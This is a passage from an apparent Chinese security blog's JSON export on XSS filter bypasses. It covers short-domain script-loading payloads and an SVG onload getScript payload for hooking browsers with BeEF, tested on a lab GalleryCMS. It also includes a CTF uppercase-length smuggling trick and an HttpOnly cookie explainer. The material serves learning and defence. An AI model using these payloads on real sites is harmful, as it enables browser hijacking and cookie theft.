和后半个闭合标签都不能缺少</span><br></pre></td></tr></table></figure>\n\n![image-20220911231941383](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220911231941383.png)\n\n2.payload长度限制为40时\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;script src=//㎭℠.co&gt;&#x27;.length</span><br></pre></td></tr></table></figure>\n\n![image-20220911232202908](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220911232202908.png)\n\n\n\n###### 存在xss_clean并且长度限制为45个字符时\n\n利用XSS_clean 漏过滤的svg来绕过\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;svg/onload=$.getScript(&quot;//㎭℠.co&quot;)&gt;</span><br></pre></td></tr></table></figure>\n\n注意：如果此时在index.html内写入hook.js，并且使用宝塔面板，一定记着把bt自己的初始页的东西删光，不然无法上线\n\n并且bt使用自己的默认index.html的，在/www/server/panel下，具体可以去bt看，这个也一定要删掉或者完全改写，否则不会访问你站点首页的自己的index.html的\n\n\n\n还有一件很诡异的事，我gallerycms搭建在本机192.168.2.13上，beef-xss在kali 192.168.13.133上，在一样的payload前提下，在本机上始终无法上线，但在kali上就可以，本机上进行了域名和ip的尝试，始终不行，最后在kali访问本机的gallerycms成功上线\n\n\n\n补充:gallerycms的对新建album的过滤在application/controllers/album.php中，修改长度在这个文件里就能修改前端限制\n\n\n\n+1补充：本篇文件缺少一些xss的基础知识，如果看不懂先看[(49条消息) XSS详解及复现gallerycms字符长度限制短域名绕过_薄荷加冰心有多冷的博客-CSDN博客](https://blog.csdn.net/weixin_44811851/article/details/126080728)\n\n这个大佬写的文章\n\n\n\n\n\n\n\n### 3.通过特殊字符变为大写后长度变为原来两倍偷渡非法字符\n\nhttps://blog.huli.tw/2022/02/08/what-i-learned-from-dicectf-2022/\n\n假設我有個字串是 `ßßßßßßßß<b>1</b>`，長度是 16，所以在初始化的時候 length 會是 16，但是當跑到迴圈的時候因為轉成大寫，會是 `8*2+8` = 24 個字，所以 24 個字會全部被寫進去 buf 裡面。\n\n在 `mock` 函式裡面，只會檢查 length 內的東西，所以最後 8 個字不會被檢查到，可以偷渡 `<>` 這些字元進去\n\n### 4.利用SVG/details绕过先抓取元素再赋值\n\ndocument.querySelector( '.note').innerHTML = text;\n\n\n\n\n\n## 补充：httponly\n\n> 　Cookie分为内存Cookie和硬盘Cookie，内存Cookie储存在浏览器内存中，关闭浏览器则消失。如果是想要利用保存在内存中的Cookie，需要获取到用户Cookie+用户浏览器未关闭。如果是硬盘Cookie，则该Cookie是一段时间有效的（有的时候我们登录网站会出现保持登录状态的选项，即保存在硬盘中），这类Cookie获取到后在其有效期内都是可以进行受害者用户身份登录的，进而实现入侵。\n>\n> 　　Cookie由变量名与值组成，其属性里有标准的cookie变量，也有用户自定义的属性。Cookie保存在浏览器的document对象中，对于存在XSS漏洞的网站，入侵者可以插入简单的XSS语句执行任意的JS脚本，以XSS攻击的手段获取网站其余用户的Cookie。\n>\n> 比如，举个简单例子：`<script>alert(document.cookie)</script>`\n<blockquote>\n<p>Cookie 是通过 http response header 种到浏览器的，设置 Cookie 的语法为：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Set-Cookie:=[;=][;expiress=][;domain=][;path=][;secure][;httponly]</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221029192451385.png\" alt=\"image-20221029192451385\"></p>\n<p>Cookie 各个参数详细内容：</p>\n<ul>\n<li>Set-Cookie:http 响应头，向客户端发送 Cookie。</li>\n<li>Name=value: 每个 Cookie 必须包含的内容。</li>\n<li>Expires=date:EXpires 确定了 Cookie 的有效终止日期，可选。如果缺省，则 Cookie 不保存在硬盘中，只保存在浏览器内存中。</li>\n<li>Domain=domain-name: 确定了哪些 inernet 域中的 web 服务器可读取浏览器储存的 Cookie，缺省为该 web 服务器域名。</li>\n<li>Path=path: 定义了 web 服务器哪些路径下的页面可获取服务器发送的 Cookie。</li>\n<li>Secure: 在 cookie 中标记该变量，表明只有为 https 通信协议时，浏览器才向服务器提交 Cookie。</li>\n<li><strong>Httponly: 禁止 javascript 读取，如果 cookie 中的一个参数带有 httponly，则这个参数将不能被 javascript 获取；httponly 可以防止 xss 会话劫持攻击。</strong></li>\n</ul>\n<p>有的网站为了防止 XSS，所以采用浏览器绑定技术，例如将 Cookie 和浏览器的 User-agent 进行绑定，一旦发现绑定不匹配则认为 Cookie 失效，但是这种方法存在很大的弊端，因为当入侵者获取到 Cookie 的同时也能获取到用户的 User-agent; 另一种防止 XSS 获取用户 Cookie 的方式是将 Cookie 和 Remote-addr 相绑定（即与 IP 绑定），但是这样的弊端是可能会带来极差的用户体验，如家里的 ADSL 拨号上网就是每次拨号连接更换一个 IP 地址。</p>\n<p>所以 HttpOnly 就应运而生了。<strong>具体含义就是，如果某个 Cookie 带有 HttpOnly 属性，那么这一条 Cookie 将被禁止读取，也就是说，JavaScript 读取不到此条 Cookie，不过在用户与服务端交互的时候，HttpRequest 包中仍然会带上这个 Cookie 信息，即用户与服务端的正常交互不受影响。如果支持 HttpOnly 的浏览器检测到包含 HttpOnly 标志的 cookie，并且客户端脚本代码尝试读取该 cookie，则浏览器将返回一个空字符串作为结果。</strong></p>\n<p>使用了 HttpOnly 只是在一定程度上抵御 XSS 盗取 Cookie 的行为，另外 HttpOnly 也不能防止入侵者做 AJAX 提交。严格来说 HttpOnly 并不是为了对抗 XSS，<strong>它解决的是 XSS 后的 Cookie 劫持问题</strong>，但是 XSS 攻击带来的不仅仅是 Cookie 劫持问题，还有窃取用户信息，模拟身份登录，操作用户账户等一系列问题。所以除了 HttpOnly 之外还需要其他的对抗解决方案。</p>\n</blockquote>\n<h2 id=\"参考\"><a class=\"markdownIt-Anchor\" href=\"#参考\">#</a> 参考</h2>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubGlhb3h1ZWZlbmcuY29tL3dpa2kvMTAyMjkxMDgyMTE0OTMxMg==\">JavaScript 教程 - 廖雪峰的官方网站 (liaoxuefeng.com)</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93YW5nZG9jLmNvbS9qYXZhc2NyaXB0Lw==\">JavaScript 教程 - 网道 (wangdoc.com)</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kZXZlbG9wZXIubW96aWxsYS5vcmcvemgtQ04vZG9jcy9XZWIvSmF2YVNjcmlwdA==\">JavaScript | MDN (mozilla.org)</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYm9va3N0YWNrLmNuL3JlYWQvamF2YXNjcmlwdC10dXRvcmlhbC9SRUFETUUubWQ=\">介绍 - 《阮一峰 JavaScript 教程》</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9yZXNlYXJjaC5zZWN1cml0dW0uY29tLw==\">research.securitum.com - securitum.com vulnerabilities researches and cyber security education publications</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubGVhdmVzb25ncy5jb20vUEVORVRSQVRJT04vamF2YXNjcmlwdC1wcm90b3R5cGUtcG9sbHV0aW9uLWF0dGFjay5odG1s\">深入理解 JavaScript Prototype 污染攻击 | 离别歌 (leavesongs.com)</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYW5xdWFua2UuY29tL3Bvc3QvaWQvMTU2MzU2\">实战 Web 缓存投毒（上）- 安全客 - 安全资讯平台 (anquanke.com)</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvcmVzZWFyY2gvcHJhY3RpY2FsLXdlYi1jYWNoZS1wb2lzb25pbmc=\">https://portswigger.net/research/practical-web-cache-poisoning</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly94c3MuYnkvI2NoZWF0c2hlZXQ=\">https://xss.by/#cheatsheet</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vQ2wwdWQvcC8xMzE5MDQxMy5odG1s\">XSS 漏洞防御之 HttpOnly - 春告鳥 - 博客园 (cnblogs.com)</span></p>\n",
            "tags": [
                "XSS"
            ]
        }
    ]
}